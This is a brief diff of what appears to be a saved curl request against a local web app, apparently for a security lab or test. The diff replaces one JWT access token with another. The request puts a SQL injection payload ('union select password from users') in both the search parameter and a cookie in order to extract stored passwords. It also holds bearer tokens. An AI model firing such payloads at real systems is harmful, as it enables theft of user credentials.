@@ -5,7 +5,7 @@ curl -k 'https://localhost:2443/api/me?search=1%20union%20select%20password%20fr
   -H 'Accept-Encoding: gzip, deflate, br, zstd' \
   -H 'Referer: https://localhost:2443/chat' \
   -H 'Content-Type: application/json' \
-  -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaW5lc0BnbWFpbC5jb20iLCJuYW1lIjoiaW5lcyIsImlhdCI6MTc1MzE4MzE3OH0.8o4fG_PcFtnsUHbxdxMbutB4v65ppBNJEMP8iZhFEdc' \
+  -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaW5lc0B0ZXN0LmNvbSIsIm5hbWUiOiJpbmVzIiwiaWF0IjoxNzUzMjk3MzI5fQ.mOO4yZucqWoqH8CYlY-QIj7zywcUXhIsSGvFYNdYY_M' \
   -H 'Connection: keep-alive' \
   -H 'Cookie: search=1 union select password from users' \
   -H 'Sec-Fetch-Dest: empty' \
